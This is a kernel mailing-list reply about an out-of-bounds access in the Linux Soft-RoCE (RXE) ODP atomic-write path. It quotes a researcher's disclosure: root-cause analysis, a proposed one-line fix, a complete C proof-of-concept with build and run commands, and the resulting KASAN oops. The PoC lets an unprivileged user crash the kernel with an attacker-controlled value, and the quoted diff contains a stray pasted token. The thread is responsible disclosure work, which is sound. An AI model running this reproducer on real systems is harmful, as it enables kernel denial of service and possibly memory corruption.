Received: from mta0.migadu.com (out-227.mta0.migadu.com [91.218.175.227])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CCAB443A80A
	for <linux-rdma@vger.kernel.org>; Tue, 13 Oct 2026 02:33:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=91.218.175.227
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791858806; cv=none; b=i1NVR1VWHDwDKsncx9R61VAYR6MJQ26bOPhrEOAkKXtrlKXMQcT+C9TOQ7fSQp9382EQroRUs1uClg4ptBJXLU3aJFH4W1T4F8zpy6Agxaps74TzZNNqD2PhVd0539cE4TW9Ffj6jSQ+3GEIWLweA+Bo/DQpfVvhfT+XJN10z3I=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791858806; c=relaxed/simple;
	bh=Nsad7yfTyt7T3ET99muDA8m+ri2Ij4rEE6GKYSXlboI=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=vCzrfA3XEOULc/KWxDMa/ARLucnFUmKfgrQvN6EHJZSbAhSLiGS0zCoMyP+MKCAirts7ENAkX9c+e8BArk1r/hbqvJaP3shNqT33QUr9755z3X/QsAbbZE6F/jOSUjgbNSj/DMPRBc4Qg9E4dSzA1RE9cWDpQ/dT9H1vfawkl4U=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev; spf=pass smtp.mailfrom=linux.dev; dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b=U3Y6FWxQ; arc=none smtp.client-ip=91.218.175.227
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.dev
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b="U3Y6FWxQ"
X-Envelope-To: linux-rdma@vger.kernel.org
DKIM-Signature: a=rsa-sha256; bh=Nsad7yfTyt7T3ET99muDA8m+ri2Ij4rEE6GKYSXlboI=;
 c=simple/simple; d=linux.dev;
 h=from:to:subject:date:message-id:mime-version:content-type; s=key1;
 t=1791858801; v=1; x=1792463601;
 b=U3Y6FWxQmMJL1LfnFnq/lcArAa0cA0JO6BZw2to9c8DtD0pjqQj3YYX0h4yvd5X8rwWJgth5
 oLdYdKtm0DJ+WKwUM9bjHyvtEpW8WEwqyOgWwxi+KDxm8bs82wIVLs3p/cQbL2js8qM/9YiSLeq
 qrTC5V4vf0Ycki02CGYJuLpg=
X-Envelope-To: linux-rdma@vger.kernel.org
Received: by smtp.migadu.com with ESMTPS id 19ec989663eb2819;
	Tue, 13 Oct 2026 02:33:21 +0000
X-Mizu-Trace-ID: 19ec989663eb2819
X-Migadu-Flow: FLOW_OUT
Date: Tue, 13 Oct 2026 10:33:47 +0800
From: Chenguang Zhao <chenguang.zhao@linux.dev>
To: hello messi <Hello_Messi_10@outlook.com>
Cc: "zyjzyj2000@gmail.com" <zyjzyj2000@gmail.com>,
	"jgg@ziepe.ca" <jgg@ziepe.ca>, "leon@kernel.org" <leon@kernel.org>,
	"linux-rdma@vger.kernel.org" <linux-rdma@vger.kernel.org>
Subject: Re: [PATCH] RDMA/rxe: require ODP MR iova to equal the umem user
 address
Message-ID: <20261013023347.GA184820@pc>
References: <SY7P300MB0292E9E08F0890A2C31CFD96DE972@SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM>
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
In-Reply-To: <SY7P300MB0292E9E08F0890A2C31CFD96DE972@SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM>

On Sun, Oct 04, 2026 at 02:07:59PM +0000, hello messi wrote:
> Hello,
> I found an out-of-bounds access in the RXE ODP MR path when an ODP memory=
 region is registered with an IOVA that differs from the user virtual addre=
ss used to create the underlying ib_umem_odp.
> The issue was reproduced on Linux v7.2.8 with Soft-RoCE (rxe0).
> Environment
>=20
> Kernel: Linux v7.2.8
> RDMA device: Soft-RoCE (rxe0)
>=20
> CONFIG_INFINIBAND_ON_DEMAND_PAGING=3Dy
> CONFIG_RDMA_RXE=3Dm
> CONFIG_KASAN=3Dy
> CONFIG_KASAN_GENERIC=3Dy
> CONFIG_KASAN_INLINE=3Dy
> CONFIG_DEBUG_INFO=3Dy
> CONFIG_DEBUG_INFO_DWARF5=3Dy
>=20
>=20
> Root cause
> rxe_odp_mr_init_user() accepts start and iova independently:
>=20
> umem_odp =3D ib_umem_odp_get(&rxe->ib_dev, start, length, access_flags,
>                            &rxe_mn_ops);
>=20
> ...
>=20
> mr->ibmr.length =3D length;
> mr->ibmr.iova =3D iova;
>=20
>=20
> The ODP page list is sized according to the UMEM user address range, whil=
e RXE calculates the page-list index from the MR IOVA:
>=20
> idx =3D (iova - ib_umem_start(umem_odp)) >> umem_odp->page_shift;
>=20
>=20
> There is no validation that the resulting index is within umem_odp->map.p=
fn_list.
> mr_check_range() does not prevent this because it validates the IOVA agai=
nst mr->ibmr.iova and mr->ibmr.length, rather than against the underlying U=
MEM user address range.
> Reproduction
> A minimal reproducer is attached as poc.c.
> The reproducer creates a one-page ODP MR with a deliberately divergent IO=
VA:
>=20
> user VA      : 0x55b0f4fb2000
> ODP IOVA     : 0x55b1f4fb2000
> IOVA delta   : 0x100000000
> ODP length   : 0x1000
> expected idx : 0x100000
>=20
>=20
> The resulting index is 0x100000, while the one-page ODP pfn_list only con=
tains the entry corresponding to the valid UMEM page.
> The reproducer then submits an RC atomic-write operation using the MR rke=
y and the divergent IOVA, reaching:
>=20
> rxe_odp_do_atomic_write()
>   -> rxe_odp_iova_to_index()
>   -> umem_odp->map.pfn_list[index]
>   -> hmm_pfn_to_page()
>   -> kmap_local_page()
>   -> smp_store_release()
>=20
>=20
> The reproducer can be executed by an unprivileged user.
> KASAN/Oops
> The reproducer triggers:
>=20
> Oops: general protection fault, probably for non-canonical address ...
> KASAN: maybe wild-memory-access ...
> CPU: 3 UID: 0 PID: 13495 Comm: kworker/u514:1
> Workqueue: rxe_wq do_work [rdma_rxe]
> RIP: 0010:rxe_odp_do_atomic_write+0x1ba/0x3e0 [rdma_rxe]
>=20
>=20
> Using faddr2line:
>=20
> rxe_odp_do_atomic_write+0x1ba/0x3e0:
> rxe_odp_do_atomic_write at
> /home/kali/linux-7.2.8/drivers/infiniband/sw/rxe/rxe_odp.c:410
>=20
>=20
> Line 410 is:
>=20
> smp_store_release(&va[page_offset >> 3], value);
>=20
>=20
> The atomic value supplied by the reproducer was:
>=20
> atomic value=3D0x4141414142424242
>=20
>=20
> The same value was present in the kernel register state at the time of th=
e fault.
> This demonstrates an out-of-bounds ODP pfn_list access in the RXE atomic-=
write path. I have not assumed arbitrary kernel write or code execution fro=
m this crash; the demonstrated impact is a kernel memory-safety violation l=
eading to a kernel fault.
> Proposed fix
> The existing ODP index calculation assumes that the MR IOVA and the UMEM =
user address refer to the same address range. The simplest fix is to reject=
 an ODP MR when these addresses differ:

Please add SOB and Fixes tag. Before sending the patch, you can use
the scripts/checkpatch.pl script to check it and ensure there are no
errors or warnings.

>=20
> diff --git a/drivers/infiniband/sw/rxe/rxe_odp.c b/drivers/infiniband/sw/=
rxe/rxe_odp.c
> index ...
> --- a/drivers/infiniband/sw/rxe/rxe_odp.c
> +++ b/drivers/infiniband/sw/rxe/rxe_odp.c
> @@ -98,6 +98,9 @@ int rxe_odp_mr_init_user(struct rxe_dev *rxe, u64 start=
, u64 length,
>                 /* Never reach here, for implicit ODP is not implemented.=
 */rxe_odp_do_atomic_op()
>         }
>=20
> +       if (iova !=3D start)
> +               return -EINVAL;
> +
>         umem_odp =3D ib_umem_odp_get(&rxe->ib_dev, start, length, access_=
flags,
>                                    &rxe_mn_ops);
>=20
>=20
> This restores the invariant required by the existing ODP index calculatio=
n and prevents a divergent IOVA from producing an out-of-range pfn_list ind=
ex.
> Please consider applying an appropriate fix to current mainline and stabl=
e kernels as appropriate.
> The reproducer is attached as poc.c, and the relevant KASAN/Oops output i=
s attached as kasan-oops.txt.
> Thanks,
> hellomessi
>=20

> #define _GNU_SOURCE
> #include <infiniband/verbs.h>
> #include <stdio.h>
> #include <stdint.h>
> #include <stdlib.h>
> #include <string.h>
> #include <errno.h>
> #include <unistd.h>
> #include <inttypes.h>
> #include <arpa/inet.h>
>=20
> #define DEV_NAME "rxe0"
> #define PORT_NUM 1
> #define GID_INDEX 1
> #define MR_LEN 0x1000ULL
> #define IOVA_DELTA 0x100000000ULL
> #define TEST_VALUE 0x4141414142424242ULL
>=20
> static void die(const char *s)
> {
>     perror(s);
>     exit(EXIT_FAILURE);
> }
>=20
> static struct ibv_device *find_device(const char *name)
> {
>     int ndev =3D 0;
>     struct ibv_device **list =3D ibv_get_device_list(&ndev);
>=20
>     if (!list)
>         die("ibv_get_device_list");
>=20
>     for (int i =3D 0; i < ndev; i++) {
>         if (!strcmp(ibv_get_device_name(list[i]), name)) {
>             struct ibv_device *dev =3D list[i];
>             ibv_free_device_list(list);
>             return dev;
>         }
>     }
>=20
>     ibv_free_device_list(list);
>     fprintf(stderr, "device %s not found\n", name);
>     exit(EXIT_FAILURE);
> }
>=20
> static int modify_qp_init(struct ibv_qp *qp)
> {
>     struct ibv_qp_attr attr;
>=20
>     memset(&attr, 0, sizeof(attr));
>     attr.qp_state =3D IBV_QPS_INIT;
>     attr.pkey_index =3D 0;
>     attr.port_num =3D PORT_NUM;
>     attr.qp_access_flags =3D
>         IBV_ACCESS_REMOTE_READ |
>         IBV_ACCESS_REMOTE_WRITE |
>         IBV_ACCESS_REMOTE_ATOMIC;
>=20
>     return ibv_modify_qp(qp, &attr,
>                          IBV_QP_STATE |
>                          IBV_QP_PKEY_INDEX |
>                          IBV_QP_PORT |
>                          IBV_QP_ACCESS_FLAGS);
> }
>=20
> static int modify_qp_rtr(struct ibv_qp *qp,
>                          uint32_t remote_qpn,
>                          uint32_t remote_psn,
>                          const union ibv_gid *gid)
> {
>     struct ibv_qp_attr attr;
>=20
>     memset(&attr, 0, sizeof(attr));
>     attr.qp_state =3D IBV_QPS_RTR;
>     attr.path_mtu =3D IBV_MTU_1024;
>     attr.dest_qp_num =3D remote_qpn;
>     attr.rq_psn =3D remote_psn;
>     attr.max_dest_rd_atomic =3D 1;
>     attr.min_rnr_timer =3D 12;
>=20
>     attr.ah_attr.is_global =3D 1;
>     attr.ah_attr.port_num =3D PORT_NUM;
>     attr.ah_attr.grh.dgid =3D *gid;
>     attr.ah_attr.grh.sgid_index =3D GID_INDEX;
>     attr.ah_attr.grh.hop_limit =3D 1;
>=20
>     return ibv_modify_qp(qp, &attr,
>                          IBV_QP_STATE |
>                          IBV_QP_AV |
>                          IBV_QP_PATH_MTU |
>                          IBV_QP_DEST_QPN |
>                          IBV_QP_RQ_PSN |
>                          IBV_QP_MAX_DEST_RD_ATOMIC |
>                          IBV_QP_MIN_RNR_TIMER);
> }
>=20
> static int modify_qp_rts(struct ibv_qp *qp, uint32_t psn)
> {
>     struct ibv_qp_attr attr;
>=20
>     memset(&attr, 0, sizeof(attr));
>     attr.qp_state =3D IBV_QPS_RTS;
>     attr.sq_psn =3D psn;
>     attr.timeout =3D 14;
>     attr.retry_cnt =3D 7;
>     attr.rnr_retry =3D 7;
>     attr.max_rd_atomic =3D 1;
>=20
>     return ibv_modify_qp(qp, &attr,
>                          IBV_QP_STATE |
>                          IBV_QP_SQ_PSN |
>                          IBV_QP_TIMEOUT |
>                          IBV_QP_RETRY_CNT |
>                          IBV_QP_RNR_RETRY |
>                          IBV_QP_MAX_QP_RD_ATOMIC);
> }
>=20
> static int poll_cq_timeout(struct ibv_cq *cq, int timeout_ms)
> {
>     struct ibv_wc wc;
>=20
>     for (int i =3D 0; i < timeout_ms; i++) {
>         int n =3D ibv_poll_cq(cq, 1, &wc);
>=20
>         if (n < 0) {
>             fprintf(stderr, "ibv_poll_cq failed\n");
>             return -1;
>         }
>=20
>         if (n =3D=3D 1) {
>             printf("completion: wr_id=3D%" PRIu64
>                    " status=3D%s (%d)"
>                    " opcode=3D%d"
>                    " vendor_err=3D0x%x\n",
>                    wc.wr_id,
>                    ibv_wc_status_str(wc.status),
>                    wc.status,
>                    wc.opcode,
>                    wc.vendor_err);
>             return wc.status =3D=3D IBV_WC_SUCCESS ? 0 : -1;
>         }
>=20
>         usleep(1000);
>     }
>=20
>     printf("CQ timeout after %d ms\n", timeout_ms);
>     return -1;
> }
>=20
> int main(void)
> {
>     struct ibv_device *dev;
>     struct ibv_context *ctx =3D NULL;
>     struct ibv_pd *pd =3D NULL;
>     struct ibv_cq *cq0 =3D NULL;
>     struct ibv_cq *cq1 =3D NULL;
>     struct ibv_qp *qp0 =3D NULL;
>     struct ibv_qp *qp1 =3D NULL;
>     struct ibv_mr *mr =3D NULL;
>     struct ibv_qp_init_attr_ex qpa;
>     struct ibv_qp_ex *qpx =3D NULL;
>     union ibv_gid gid;
>     void *buf =3D NULL;
>     uint32_t psn0 =3D 0x12345;
>     uint32_t psn1 =3D 0x23456;
>     uint64_t user_va;
>     uint64_t iova;
>     uint64_t value =3D TEST_VALUE;
>     int ret;
>=20
>     dev =3D find_device(DEV_NAME);
>=20
>     ctx =3D ibv_open_device(dev);
>     if (!ctx)
>         die("ibv_open_device");
>=20
>     if (ibv_query_gid(ctx, PORT_NUM, GID_INDEX, &gid))
>         die("ibv_query_gid");
>=20
>     char gid_str[INET6_ADDRSTRLEN + 32];
>     if (!inet_ntop(AF_INET6, gid.raw, gid_str, sizeof(gid_str)))
>         strcpy(gid_str, "?");
>=20
>     printf("device: %s\n", ibv_get_device_name(dev));
>     printf("GID[%d]: %s\n", GID_INDEX, gid_str);
>=20
>     pd =3D ibv_alloc_pd(ctx);
>     if (!pd)
>         die("ibv_alloc_pd");
>=20
>     cq0 =3D ibv_create_cq(ctx, 16, NULL, NULL, 0);
>     if (!cq0)
>         die("ibv_create_cq");
>=20
>     cq1 =3D ibv_create_cq(ctx, 16, NULL, NULL, 0);
>     if (!cq1)
>         die("ibv_create_cq");
>=20
>     memset(&qpa, 0, sizeof(qpa));
>     qpa.comp_mask =3D
>         IBV_QP_INIT_ATTR_PD |
>         IBV_QP_INIT_ATTR_SEND_OPS_FLAGS;
>     qpa.pd =3D pd;
>     qpa.send_cq =3D cq0;
>     qpa.recv_cq =3D cq0;
>     qpa.qp_type =3D IBV_QPT_RC;
>     qpa.cap.max_send_wr =3D 16;
>     qpa.cap.max_recv_wr =3D 16;
>     qpa.cap.max_send_sge =3D 1;
>     qpa.cap.max_recv_sge =3D 1;
>     qpa.send_ops_flags =3D
>         IBV_QP_EX_WITH_ATOMIC_WRITE;
>=20
>     qp0 =3D ibv_create_qp_ex(ctx, &qpa);
>     if (!qp0)
>         die("ibv_create_qp_ex qp0");
>=20
>     qpa.send_cq =3D cq1;
>     qpa.recv_cq =3D cq1;
>=20
>     qp1 =3D ibv_create_qp_ex(ctx, &qpa);
>     if (!qp1)
>         die("ibv_create_qp_ex qp1");
>=20
>     ret =3D modify_qp_init(qp0);
>     if (ret)
>         die("modify qp0 INIT");
>=20
>     ret =3D modify_qp_init(qp1);
>     if (ret)
>         die("modify qp1 INIT");
>=20
>     ret =3D modify_qp_rtr(qp0, qp1->qp_num, psn1, &gid);
>     if (ret)
>         die("modify qp0 RTR");
>=20
>     ret =3D modify_qp_rtr(qp1, qp0->qp_num, psn0, &gid);
>     if (ret)
>         die("modify qp1 RTR");
>=20
>     ret =3D modify_qp_rts(qp0, psn0);
>     if (ret)
>         die("modify qp0 RTS");
>=20
>     ret =3D modify_qp_rts(qp1, psn1);
>     if (ret)
>         die("modify qp1 RTS");
>=20
>     ret =3D posix_memalign(&buf, 4096, MR_LEN);
>     if (ret) {
>         errno =3D ret;
>         die("posix_memalign");
>     }
>=20
>     memset(buf, 0x41, MR_LEN);
>=20
>     user_va =3D (uint64_t)(uintptr_t)buf;
>     iova =3D user_va + IOVA_DELTA;
>=20
>     mr =3D ibv_reg_mr_iova2(
>         pd,
>         buf,
>         MR_LEN,
>         iova,
>         IBV_ACCESS_LOCAL_WRITE |
>         IBV_ACCESS_REMOTE_READ |
>         IBV_ACCESS_REMOTE_WRITE |
>         IBV_ACCESS_REMOTE_ATOMIC |
>         IBV_ACCESS_ON_DEMAND);
>=20
>     if (!mr)
>         die("ibv_reg_mr_iova2");
>=20
>     printf("user VA      : 0x%" PRIx64 "\n", user_va);
>     printf("ODP IOVA     : 0x%" PRIx64 "\n", iova);
>     printf("IOVA delta   : 0x%" PRIx64 "\n",
>            iova - user_va);
>     printf("ODP lkey     : 0x%x\n", mr->lkey);
>     printf("ODP rkey     : 0x%x\n", mr->rkey);
>     printf("ODP length   : 0x%llx\n",
>            (unsigned long long)MR_LEN);
>     printf("expected idx : 0x%" PRIx64 "\n",
>            (iova - user_va) >> 12);
>=20
>     if (((iova - user_va) >> 12) !=3D 0x100000) {
>         fprintf(stderr, "unexpected ODP index\n");
>         return EXIT_FAILURE;
>     }
>=20
>     qpx =3D ibv_qp_to_qp_ex(qp0);
>     if (!qpx) {
>         fprintf(stderr, "ibv_qp_to_qp_ex failed\n");
>         return EXIT_FAILURE;
>     }
>=20
>     qpx->wr_id =3D 0x41414141;
>     qpx->wr_flags =3D IBV_SEND_SIGNALED;
>=20
>     ibv_wr_start(qpx);
>=20
>     ibv_wr_atomic_write(
>         qpx,
>         mr->rkey,
>         iova,
>         &value);
>=20
>     ret =3D ibv_wr_complete(qpx);
>=20
>     printf("ibv_wr_complete: %d\n", ret);
>=20
>     if (ret) {
>         errno =3D ret;
>         perror("ibv_wr_complete");
>     }
>=20
>     printf("atomic write remote_addr=3D0x%" PRIx64 "\n", iova);
>     printf("atomic write rkey=3D0x%x\n", mr->rkey);
>     printf("atomic value=3D0x%" PRIx64 "\n", value);
>     printf("triggering ODP atomic-write path...\n");
>=20
>     poll_cq_timeout(cq0, 5000);
>=20
>     printf("verification finished\n");
>=20
>     ibv_dereg_mr(mr);
>     free(buf);
>     ibv_destroy_qp(qp1);
>     ibv_destroy_qp(qp0);
>     ibv_destroy_cq(cq1);
>     ibv_destroy_cq(cq0);
>     ibv_dealloc_pd(pd);
>     ibv_close_device(ctx);
>=20
>     return 0;
> }

> gcc -O0 -g -Wall -Wextra -o poc poc.c -libverbs
>=20
> ??????$ su - pocuser -c /tmp/poc
> ?????????=20
> device: rxe0
> GID[1]: ::ffff:127.0.0.1
> user VA      : 0x55b0f4fb2000
> ODP IOVA     : 0x55b1f4fb2000
> IOVA delta   : 0x100000000
> ODP lkey     : 0x754
> ODP rkey     : 0x754
> ODP length   : 0x1000
> expected idx : 0x100000
> ibv_wr_complete: 0
> atomic write remote_addr=3D0x55b1f4fb2000
> atomic write rkey=3D0x754
> atomic value=3D0x4141414142424242
> triggering ODP atomic-write path...
> CQ timeout after 5000 ms
> verification finished
>=20
> ??????$ dmesg -T | tail -250
> [??? 10???  4 21:31:47 2026] Oops: general protection fault, probably for=
 non-canonical address 0xf99986a999999800: 0000 [#3] SMP KASAN PTI
> [??? 10???  4 21:31:47 2026] KASAN: maybe wild-memory-access in range [0x=
cccc554cccccc000-0xcccc554cccccc007]
> [??? 10???  4 21:31:47 2026] CPU: 3 UID: 0 PID: 13495 Comm: kworker/u514:=
1 Tainted: G    B D W           7.2.8 #2 PREEMPT(lazy)=20
> [??? 10???  4 21:31:47 2026] Tainted: [B]=3DBAD_PAGE, [D]=3DDIE, [W]=3DWA=
RN
> [??? 10???  4 21:31:47 2026] Hardware name: VMware, Inc. VMware Virtual P=
latform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
> [??? 10???  4 21:31:47 2026] Workqueue: rxe_wq do_work [rdma_rxe]
> [??? 10???  4 21:31:47 2026] RIP: 0010:rxe_odp_do_atomic_write+0x1ba/0x3e=
0 [rdma_rxe]
> [??? 10???  4 21:31:47 2026] Code: 01 00 00 48 03 05 9e f2 96 c3 41 c1 e8=
 03 42 8d 14 c5 00 00 00 00 48 01 d0 48 ba 00 00 00 00 00 fc ff df 48 89 c1=
 48 c1 e9 03 <80> 3c 11 00 0f 85 b5 01 00 00 48 89 18 48 8d bd e0 00 00 00 =
e8 cd
> [??? 10???  4 21:31:47 2026] RSP: 0018:ffffc90015d1fa38 EFLAGS: 00010a06
> [??? 10???  4 21:31:47 2026] RAX: cccc554cccccc000 RBX: 4141414142424242 =
RCX: 19998aa999999800
> [??? 10???  4 21:31:47 2026] RDX: dffffc0000000000 RSI: 0000000000000008 =
RDI: ffffc90015d1fa08
> [??? 10???  4 21:31:47 2026] RBP: ffff88812f29a000 R08: 0000000000000000 =
R09: ffff88812f29a108
> [??? 10???  4 21:31:47 2026] R10: 0000000000000008 R11: 000055b1f4fb3000 =
R12: ffff888107984998
> [??? 10???  4 21:31:47 2026] R13: ffff88812f299400 R14: ffff888106c13800 =
R15: 4141414142424242
> [??? 10???  4 21:31:47 2026] FS:  0000000000000000(0000) GS:ffff888265a1d=
000(0000) knlGS:0000000000000000
> [??? 10???  4 21:31:47 2026] CS:  0010 DS: 0000 ES: 0000 CR0: 00000000800=
50033
> [??? 10???  4 21:31:47 2026] CR2: 00007ff015c0441c CR3: 000000012bd96004 =
CR4: 0000000000370ef0
> [??? 10???  4 21:31:47 2026] Call Trace:
> [??? 10???  4 21:31:47 2026]  <TASK>
> [??? 10???  4 21:31:47 2026]  rxe_receiver+0x26f2/0xa000 [rdma_rxe]
> [??? 10???  4 21:31:47 2026]  ? __pfx_rxe_receiver+0x10/0x10 [rdma_rxe]
> [??? 10???  4 21:31:47 2026]  ? __wake_up+0x44/0x60
> [??? 10???  4 21:31:47 2026]  ? __pfx_rxe_completer+0x10/0x10 [rdma_rxe]
> [??? 10???  4 21:31:47 2026]  ? n_tty_receive_buf_common+0x89d/0x1700
> [??? 10???  4 21:31:47 2026]  ? __pfx_rxe_requester+0x10/0x10 [rdma_rxe]
> [??? 10???  4 21:31:47 2026]  ? _raw_spin_lock_irqsave+0x94/0xf0
> [??? 10???  4 21:31:47 2026]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
> [??? 10???  4 21:31:47 2026]  ? __asan_memset+0x27/0x50
> [??? 10???  4 21:31:47 2026]  ? __pfx_rxe_receiver+0x10/0x10 [rdma_rxe]
> [??? 10???  4 21:31:47 2026]  do_work+0x149/0x610 [rdma_rxe]
> [??? 10???  4 21:31:47 2026]  process_one_work+0x6aa/0xfa0
> [??? 10???  4 21:31:47 2026]  ? assign_work+0x129/0x5a0
> [??? 10???  4 21:31:47 2026]  worker_thread+0x4ea/0xd50
> [??? 10???  4 21:31:47 2026]  ? __kthread_parkme+0x8d/0x170
> [??? 10???  4 21:31:47 2026]  ? __pfx_worker_thread+0x10/0x10
> [??? 10???  4 21:31:47 2026]  ? __pfx_worker_thread+0x10/0x10
> [??? 10???  4 21:31:47 2026]  kthread+0x327/0x410
> [??? 10???  4 21:31:47 2026]  ? recalc_sigpending+0x15c/0x200
> [??? 10???  4 21:31:47 2026]  ? __pfx_kthread+0x10/0x10
> [??? 10???  4 21:31:47 2026]  ret_from_fork+0x4d5/0x760
> [??? 10???  4 21:31:47 2026]  ? __pfx_ret_from_fork+0x10/0x10
> [??? 10???  4 21:31:47 2026]  ? __switch_to+0x3ab/0xd00
> [??? 10???  4 21:31:47 2026]  ? __switch_to_asm+0x39/0x70
> [??? 10???  4 21:31:47 2026]  ? __switch_to_asm+0x33/0x70
> [??? 10???  4 21:31:47 2026]  ? __pfx_kthread+0x10/0x10
> [??? 10???  4 21:31:47 2026]  ret_from_fork_asm+0x1a/0x30
> [??? 10???  4 21:31:47 2026]  </TASK>
> [??? 10???  4 21:31:47 2026] Modules linked in: mptcp_diag xsk_diag vsock=
_diag tcp_diag udp_diag raw_diag inet_diag unix_diag af_packet_diag netlink=
_diag rpcrdma rdma_ucm ib_uverbs ib_uverbs_support ib_iser rdma_cm iw_cm ib=
_cm libiscsi scsi_transport_iscsi rdma_rxe ip6_udp_tunnel udp_tunnel ib_cor=
e xt_nat xt_tcpudp nf_conntrack_netlink veth snd_seq_dummy snd_seq_midi snd=
_hrtimer snd_seq_midi_event snd_seq xt_conntrack nft_chain_nat xt_MASQUERAD=
E nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 bridge stp llc xfrm_use=
r xfrm_algo xt_addrtype nft_compat x_tables nf_tables overlay intel_rapl_ms=
r intel_rapl_common intel_uncore_frequency_common intel_pmc_core pmt_teleme=
try pmt_discovery pmt_class intel_pmc_ssram_telemetry intel_pmc_pwrm_teleme=
try intel_vsec rapl vmw_balloon rfkill qrtr pcspkr snd_ens1371 snd_ac97_cod=
ec ac97_bus gameport snd_rawmidi snd_seq_device snd_pcm snd_timer snd sound=
core sunrpc binfmt_misc ac joydev sg evdev tls configfs efi_pstore vsock_lo=
opback vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock
> [??? 10???  4 21:31:47 2026]  vmw_vmci autofs4 ext4 crc16 mbcache jbd2 hi=
d_generic usbhid hid vmwgfx drm_ttm_helper ttm drm_client_lib sr_mod drm_km=
s_helper cdrom uhci_hcd sd_mod ata_generic ehci_pci drm psmouse ehci_hcd mp=
tspi usbcore ata_piix mptscsih aesni_intel mptbase gf128mul libata serio_ra=
w e1000 scsi_transport_spi usb_common i2c_piix4 scsi_mod i2c_smbus scsi_com=
mon button
> [??? 10???  4 21:31:47 2026] ---[ end trace 0000000000000000 ]---
> [??? 10???  4 21:31:47 2026] RIP: 0010:rxe_odp_do_atomic_write+0x1ba/0x3e=
0 [rdma_rxe]
> [??? 10???  4 21:31:47 2026] Code: 01 00 00 48 03 05 9e f2 96 c3 41 c1 e8=
 03 42 8d 14 c5 00 00 00 00 48 01 d0 48 ba 00 00 00 00 00 fc ff df 48 89 c1=
 48 c1 e9 03 <80> 3c 11 00 0f 85 b5 01 00 00 48 89 18 48 8d bd e0 00 00 00 =
e8 cd
> [??? 10???  4 21:31:47 2026] RSP: 0018:ffffc90000affa38 EFLAGS: 00010a06
> [??? 10???  4 21:31:47 2026] RAX: cccc554cccccc000 RBX: 4141414142424242 =
RCX: 19998aa999999800
> [??? 10???  4 21:31:47 2026] RDX: dffffc0000000000 RSI: 0000000000000008 =
RDI: ffffc90000affa08
> [??? 10???  4 21:31:47 2026] RBP: ffff88813bb85000 R08: 0000000000000000 =
R09: ffff88813bb85108
> [??? 10???  4 21:31:47 2026] R10: 0000000000000008 R11: 000055d48bd40000 =
R12: ffff88810678cea8
> [??? 10???  4 21:31:47 2026] R13: ffff88813bb80e00 R14: ffff888107a3b800 =
R15: 4141414142424242
> [??? 10???  4 21:31:47 2026] FS:  0000000000000000(0000) GS:ffff888265a1d=
000(0000) knlGS:0000000000000000
> [??? 10???  4 21:31:47 2026] CS:  0010 DS: 0000 ES: 0000 CR0: 00000000800=
50033
> [??? 10???  4 21:31:47 2026] CR2: 00007ff015c0441c CR3: 000000012bd96004 =
CR4: 0000000000370ef0
> [??? 10???  4 21:32:44 2026] ------------[ cut here ]------------
> [??? 10???  4 21:32:44 2026] WARNING: drivers/infiniband/sw/rxe/rxe_pool.=
c:212 at __rxe_cleanup+0x222/0x2a0 [rdma_rxe], CPU#3: poc/13609
> [??? 10???  4 21:32:44 2026] Modules linked in: mptcp_diag xsk_diag vsock=
_diag tcp_diag udp_diag raw_diag inet_diag unix_diag af_packet_diag netlink=
_diag rpcrdma rdma_ucm ib_uverbs ib_uverbs_support ib_iser rdma_cm iw_cm ib=
_cm libiscsi scsi_transport_iscsi rdma_rxe ip6_udp_tunnel udp_tunnel ib_cor=
e xt_nat xt_tcpudp nf_conntrack_netlink veth snd_seq_dummy snd_seq_midi snd=
_hrtimer snd_seq_midi_event snd_seq xt_conntrack nft_chain_nat xt_MASQUERAD=
E nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 bridge stp llc xfrm_use=
r xfrm_algo xt_addrtype nft_compat x_tables nf_tables overlay intel_rapl_ms=
r intel_rapl_common intel_uncore_frequency_common intel_pmc_core pmt_teleme=
try pmt_discovery pmt_class intel_pmc_ssram_telemetry intel_pmc_pwrm_teleme=
try intel_vsec rapl vmw_balloon rfkill qrtr pcspkr snd_ens1371 snd_ac97_cod=
ec ac97_bus gameport snd_rawmidi snd_seq_device snd_pcm snd_timer snd sound=
core sunrpc binfmt_misc ac joydev sg evdev tls configfs efi_pstore vsock_lo=
opback vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock
> [??? 10???  4 21:32:44 2026]  vmw_vmci autofs4 ext4 crc16 mbcache jbd2 hi=
d_generic usbhid hid vmwgfx drm_ttm_helper ttm drm_client_lib sr_mod drm_km=
s_helper cdrom uhci_hcd sd_mod ata_generic ehci_pci drm psmouse ehci_hcd mp=
tspi usbcore ata_piix mptscsih aesni_intel mptbase gf128mul libata serio_ra=
w e1000 scsi_transport_spi usb_common i2c_piix4 scsi_mod i2c_smbus scsi_com=
mon button
> [??? 10???  4 21:32:44 2026] CPU: 3 UID: 1001 PID: 13609 Comm: poc Tainte=
d: G    B D W           7.2.8 #2 PREEMPT(lazy)=20
